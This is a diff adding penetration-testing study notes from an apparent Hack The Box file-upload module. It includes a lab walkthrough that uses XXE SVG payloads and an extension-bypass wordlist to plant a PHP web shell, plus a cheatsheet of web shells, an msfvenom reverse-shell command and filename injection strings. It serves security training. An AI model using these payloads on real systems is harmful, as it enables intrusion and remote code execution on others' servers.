@@ -784,7 +784,232 @@ if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
 }
 ```
 
+# Other Upload Attacks
 
+In addition to arbitrary file uploads and limited file upload attacks, there are a few other techniques and attacks worth mentioning, as they may become handy in some web penetration tests or bug bounty tests. Let's discuss some of these techniques and when we may use them.
+
+## Injections in File Name
+
+A common file upload attack uses a malicious string for the uploaded file name, which may get executed or processed if the uploaded file name is displayed (i.e., reflected) on the page. We can try injecting a command in the file name, and if the web application uses the file name within an OS command, it may lead to a command injection attack.
+
+For example, if we name a file `file$(whoami).jpg` or ``file`whoami`.jpg`` or `file.jpg||whoami`, and then the web application attempts to move the uploaded file with an OS command (e.g. `mv file /tmp`), then our file name would inject the `whoami` command, which would get executed, leading to remote code execution. You may refer to the [Command Injections](https://academy.hackthebox.com/module/details/109) module for more information.
+
+Similarly, we may use an XSS payload in the file name (e.g. `<script>alert(window.origin);</script>`), which would get executed on the target's machine if the file name is displayed to them. We may also inject an SQL query in the file name (e.g. `file';select+sleep(5);--.jpg`), which may lead to an SQL injection if the file name is insecurely used in an SQL query.
+
+## Upload Directory Disclosure
+
+In some file upload forms, like a feedback form or a submission form, we may not have access to the link of our uploaded file and may not know the uploads directory. In such cases, we may utilize fuzzing to look for the uploads directory or even use other vulnerabilities (e.g., LFI/XXE) to find where the uploaded files are by reading the web applications source code, as we saw in the previous section. Furthermore, the [Web Attacks/IDOR](https://academy.hackthebox.com/module/details/134) module discusses various methods of finding where files may be stored and identifying the file naming scheme.
+
+Another method we can use to disclose the uploads directory is through forcing error messages, as they often reveal helpful information for further exploitation. One attack we can use to cause such errors is uploading a file with a name that already exists or sending two identical requests simultaneously. This may lead the web server to show an error that it could not write the file, which may disclose the uploads directory. We may also try uploading a file with an overly long name (e.g., 5,000 characters). If the web application does not handle this correctly, it may also error out and disclose the upload directory.
+
+Similarly, we may try various other techniques to cause the server to error out and disclose the uploads directory, along with additional helpful information.
+
+## Windows-specific Attacks
+
+We can also use a few `Windows-Specific` techniques in some of the attacks we discussed in the previous sections.
+
+One such attack is using reserved characters, such as (`|`, `<`, `>`, `*`, or `?`), which are usually reserved for special uses like wildcards. If the web application does not properly sanitize these names or wrap them within quotes, they may refer to another file (which may not exist) and cause an error that discloses the upload directory. Similarly, we may use Windows reserved names for the uploaded file name, like (`CON`, `COM1`, `LPT1`, or `NUL`), which may also cause an error as the web application will not be allowed to write a file with this name.
+
+Finally, we may utilize the Windows [8.3 Filename Convention](https://en.wikipedia.org/wiki/8.3_filename) to overwrite existing files or refer to files that do not exist. Older versions of Windows were limited to a short length for file names, so they used a Tilde character (`~`) to complete the file name, which we can use to our advantage.
+
+For example, to refer to a file called (`hackthebox.txt`) we can use (`HAC~1.TXT`) or (`HAC~2.TXT`), where the digit represents the order of the matching files that start with (`HAC`). As Windows still supports this convention, we can write a file called (e.g. `WEB~.CONF`) to overwrite the `web.conf` file. Similarly, we may write a file that replaces sensitive system files. This attack can lead to several outcomes, like causing information disclosure through errors, causing a DoS on the back-end server, or even accessing private files.
+
+## Advanced File Upload Attacks
+
+In addition to all of the attacks we have discussed in this module, there are more advanced attacks that can be used with file upload functionalities. Any automatic processing that occurs to an uploaded file, like encoding a video, compressing a file, or renaming a file, may be exploited if not securely coded.
+
+Some commonly used libraries may have public exploits for such vulnerabilities, like the AVI upload vulnerability leading to XXE in `ffmpeg`. However, when dealing with custom code and custom libraries, detecting such vulnerabilities requires more advanced knowledge and techniques, which may lead to discovering an advanced file upload vulnerability in some web applications.
+
+There are many other advanced file upload vulnerabilities that we did not discuss in this module. Try to read some bug bounty reports to explore more advanced file upload vulnerabilities.
+
+## Skills Assesment
+
+![](Pasted%20image%2020250220105645.png)
+
+I noticed the `upload` form inside `/contact`:
+
+![](Pasted%20image%2020250220105711.png)
+
+- I'll remove the front-end checking:
+
+![](Pasted%20image%2020250220111501.png)
+
+- Now I'll capture the request and fuzz the accepted file types:
+
+![](Pasted%20image%2020250220111609.png)
+
+- Now I'll send it to Intruder to fuzz for accepted files by backend using web extensions wordlist `/usr/share/seclists/Discovery/Web-Content/web-extensions-big.txt`:
+
+![](Pasted%20image%2020250220112855.png)
+
+- I noticed that `.svg` is there, so I'll try to upload a malicious `.svg`. But first, I need to know the content type signature of an `.svg`. So I'll check it with:
+
+```shell
+cat /usr/share/seclists/Discovery/Web-Content/web-all-content-types.txt | grep 'svg'   
+
+image/svg+xml
+application/vnd.oipf.dae.svg+xml
+```
+
+- I'll try with `image/svg+xml`:
+
+![](Pasted%20image%2020250220113135.png)
+
+- It worked! So now I'll modify its content to a XXE to read the flag:
+
+```shell
+<?xml version="1.0" encoding="iso-8859-1"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
+<svg>&xxe;</svg>
+```
+
+![](Pasted%20image%2020250220114254.png)
+
+![](Pasted%20image%2020250220114316.png)
+
+- As I can't read the flag, I'll try to get a web shell. First, I'll read the content of the `upload.php`:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
+<svg>&xxe;</svg>
+```
+
+- If I decode it from base64 gives me this:
+
+```php
+<?php
+require_once('./common-functions.php');
+
+// uploaded files directory
+	$target_dir = "./user_feedback_submissions/";
+
+// rename before storing
+$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
+$target_file = $target_dir . $fileName;
+
+// get content headers
+$contentType = $_FILES['uploadFile']['type'];
+$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);
+
+// blacklist test
+if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
+    echo "Extension not allowed";
+    die();
+}
+
+// whitelist test
+if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
+    echo "Only images are allowed";
+    die();
+}
+
+// type test
+foreach (array($contentType, $MIMEtype) as $type) {
+    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
+        echo "Only images are allowed";
+        die();
+    }
+}
+
+// size test
+if ($_FILES["uploadFile"]["size"] > 500000) {
+    echo "File too large";
+    die();
+}
+
+if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
+    displayHTMLImage($target_file);
+} else {
+    echo "File failed to upload";
+}
+```
+
+- So the directory `./user_feedback_submissions/` is where our content is being uploaded. So now I need to know the extension allowed for uploading a web shell. We also know that the file will be saved as `DATE_name.extension` For this, I'll use the following script to generate a list of possible combinations:
+
+```shell
+for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
+    for ext in '.php' '.phps' '.phtml' '.phar'; do
+        echo "shell$char$ext.jpg" >> wordlist.txt
+        echo "shell$ext$char.jpg" >> wordlist.txt
+        echo "shell.jpg$char$ext" >> wordlist.txt
+        echo "shell.jpg$ext$char" >> wordlist.txt
+    done
+done
+```
+
+- Now I'll use Burp to test which one is valid to upload:
+
+![](Pasted%20image%2020250220115316.png)
+
+- It seems that `.phar.jpg` is working:
+
+![](Pasted%20image%2020250220115417.png)
+
+- So I'll send it to the Repeater and test a webshell:
+
+![](Pasted%20image%2020250220115601.png)
+
+- It didn't work, so I'll need to fuzz MIME Types. For this I checked the [List of File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures):
+
+![](Pasted%20image%2020250220115709.png)
+
+- It worked!
+
+![](Pasted%20image%2020250220120238.png)
+
+- Then I submitted the request. So now I'll open my web shell like: `http://94.237.54.190:39446/user_feedback_submissions/20250220_shell.phar.jpg?cmd=id`:
+	- I had to reset the machine because it got corrupted, but followed the same steps.
+
+![](Pasted%20image%2020250220143736.png)
+
+- Now I can list the `/` directory and check for the flag:
+
+![](Pasted%20image%2020250220143845.png)
+
+## HTB Cheatsheet
+
+## Web Shells
+
+|**Web Shell**|**Description**|
+|---|---|
+|`<?php file_get_contents('/etc/passwd'); ?>`|Basic PHP File Read|
+|`<?php system('hostname'); ?>`|Basic PHP Command Execution|
+|`<?php system($_REQUEST['cmd']); ?>`|Basic PHP Web Shell|
+|`<% eval request('cmd') %>`|Basic ASP Web Shell|
+|`msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`|Generate PHP reverse shell|
+|[PHP Web Shell](https://github.com/Arrexel/phpbash)|PHP Web Shell|
+|[PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)|PHP Reverse Shell|
+|[Web/Reverse Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)|List of Web Shells and Reverse Shells|
+
+## Bypasses
+
+|**Command**|**Description**|
+|---|---|
+|**Client-Side Bypass**||
+|`[CTRL+SHIFT+C]`|Toggle Page Inspector|
+|**Blacklist Bypass**||
+|`shell.phtml`|Uncommon Extension|
+|`shell.pHp`|Case Manipulation|
+|[PHP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)|List of PHP Extensions|
+|[ASP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP)|List of ASP Extensions|
+|[Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)|List of Web Extensions|
+|**Whitelist Bypass**||
+|`shell.jpg.php`|Double Extension|
+|`shell.php.jpg`|Reverse Double Extension|
+|`%20`, `%0a`, `%00`, `%0d0a`, `/`, `.\`, `.`, `…`|Character Injection - Before/After Extension|
+|**Content/Type Bypass**||
+|[Web Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)|List of Web Content-Types|
+|[Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt)|List of All Content-Types|
+|[File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)|List of File Signatures/Magic Bytes|
+
+## Limited Uploads
+
+|**Potential Attack**|**File Types**|
+|---|---|
+|`XSS`|HTML, JS, SVG, GIF|
+|`XXE`/`SSRF`|XML, SVG, PDF, PPT, DOC|
+|`DoS`|ZIP, JPG, PNG|
 
 
 
